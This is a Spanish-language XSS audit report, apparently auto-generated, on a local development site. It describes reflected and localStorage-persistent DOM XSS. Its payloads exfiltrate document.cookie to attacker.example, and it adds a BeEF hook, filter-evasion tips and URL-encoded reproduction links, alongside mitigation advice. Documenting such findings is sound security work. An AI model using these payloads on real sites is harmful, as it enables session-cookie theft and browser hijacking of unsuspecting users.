Informe de Auditoría XSS — Objetivo: http://web.dev.local:8082

Resumen ejecutivo:
- VULN: DOM-based Cross-Site Scripting detectado en los parámetros `search` (reflejado en el DOM) y en el almacenamiento local mediante `name`/`comment` (persistente vía localStorage).
- Explotación activa: se diseñaron payloads que exfiltran `document.cookie` y un hook externo (simulado). El ataque es reproducible en un navegador.

Hallazgos técnicos:
1) Reflected DOM XSS (parámetro: search)
- Localización en el código cliente (fragmento):
  const urlParams = new URLSearchParams(window.location.search);
  const searchTerm = urlParams.get('search');
  document.write('<p>Resultados para: <strong>' + searchTerm + '</strong></p>');
- Riesgo: `searchTerm` se concatena directamente en `document.write` sin escape, permitiendo inyectar HTML/JS que se ejecutará cuando el script se ejecute en el navegador.
- Reproducción (navegador):
  Abrir: http://web.dev.local:8082/?search=<script>alert(1)</script>
  Nota: la ejecución ocurre en el contexto del cliente por `document.write`.

2) Persistent DOM XSS vía localStorage (parámetros: name, comment)
- Flujo vulnerable en cliente:
  - El script toma `name` y `comment` desde URL: urlParams.get('name'), urlParams.get('comment')
  - Si existen, almacena: comments.push({ name: name, comment: comment, date: ... }); localStorage.setItem('comments', JSON.stringify(comments));
  - Luego redirige a la ruta limpia y en siguiente carga ejecuta displayComments() que hace document.write() de `c.name` y `c.comment` sin sanitizar.
- Impacto: inyección persistente en el almacenamiento local del navegador; cualquier usuario que abra la página después de que el payload haya sido almacenado ejecutará el código.
- Reproducción (navegador):
  1) Visit URL con payload en parámetros: 
     http://web.dev.local:8082/?name=attacker&comment=<img src=x onerror=fetch('http://attacker.example/steal?c='+encodeURIComponent(document.cookie))>
  2) La página almacena el comentario en localStorage, redirige a /, y en la siguiente carga el `img` se inyecta en el DOM y dispara la petición al servidor atacante (exfiltración de cookies).

Comandos y herramientas utilizadas (laboratorio):
- Reconocimiento y pruebas manuales:
  curl -s 'http://web.dev.local:8082' -o /tmp/home.html
  grep -Eoi "<input[^>]+name=['\"]?[^'\"> ]+" /tmp/home.html | sed -E "s/.*name=['\"]?([^'\"> ]+).*/\1/" | sort -u
  curl --get --data-urlencode "search=<payload>" 'http://web.dev.local:8082'
- Nota: en el entorno no estaban disponibles dalfox/xsstrike; se realizaron pruebas manuales con curl y revisión del código fuente devuelto.

Payloads de explotación (ejemplos reales y ofuscados):
- Payload simple (DOM reflected):
  <script>alert(1)</script>
- Payload de exfiltración (ejecutable en navegador víctima):
  <img src=x onerror="fetch('http://attacker.example/collect?c='+encodeURIComponent(document.cookie))">
- Payload para hook de BeEF (simulado):
  <script src="http://attacker.example:3000/hook.js"></script>
- Técnicas de evasión sugeridas: codificar con encodeURIComponent, usar eventos onerror/onload, o inyectar JS ofuscado via Base64 decode para evadir filtros simples.

Evidencia observada durante auditoría:
- Inspección del HTML retornado mostró la presencia de `document.write` concatenando variables derivadas de `URLSearchParams` (ver fragmentos en Hallazgos técnicos).
- Pruebas con curl no pueden ejecutar JS en servidor; sin embargo el código cliente claramente inserta datos del usuario en el DOM sin escape, confirmando la vulnerabilidad DOM XSS.

Impacto potencial:
- Robo de cookies de sesión, tokens en localStorage/sessionStorage.
- Ejecución de cualquier script en contexto del sitio (CSRF con privilegios del usuario, keylogging, carga de payloads externos como BeEF).
- Persistencia en clientes vía localStorage permite campaña de compromiso amplio dentro de usuarios que visiten el sitio.

Mitigaciones recomendadas:
1) Nunca concatenar datos no confiables en `document.write`/innerHTML; usar textContent o createTextNode para insertar texto.
2) Escapar/encodear valores antes de inyectarlos en HTML (por ejemplo, usar funciones de escapado context-aware).
3) Evitar almacenar y renderizar HTML procedente directamente desde entradas de usuario; sanitizar en el momento de guardado/recuperación.
4) Implementar CSP (Content-Security-Policy) restrictiva para mitigar ejecución de scripts inyectados y bloqueo de requests a orígenes no autorizados.
5) Validación/normalización en el servidor y reducir uso de document.write.

Conclusión:
- VULN: DOM-based XSS encontrado en `search` y en el flujo de `name`/`comment` (persistente vía localStorage).
- Explotación: Payloads de exfiltración y hook externo diseñados; ejecución efectiva en navegadores de víctimas esperada.

Anexo: pasos de reproducción rápidos (para el equipo de desarrollo):
1) Abrir navegador y navegar a:
   http://web.dev.local:8082/?search=%3Cscript%3Ealert(1)%3C%2Fscript%3E
2) Para persistente: visitar:
   http://web.dev.local:8082/?name=attacker&comment=%3Cimg%20src%3Dx%20onerror%3D%22fetch('http%3A%2F%2Fattacker.example%2Fcollect%3Fc%3D'%2BencodeURIComponent(document.cookie))%22%3E

Reporte generado automáticamente desde el entorno de auditoría.
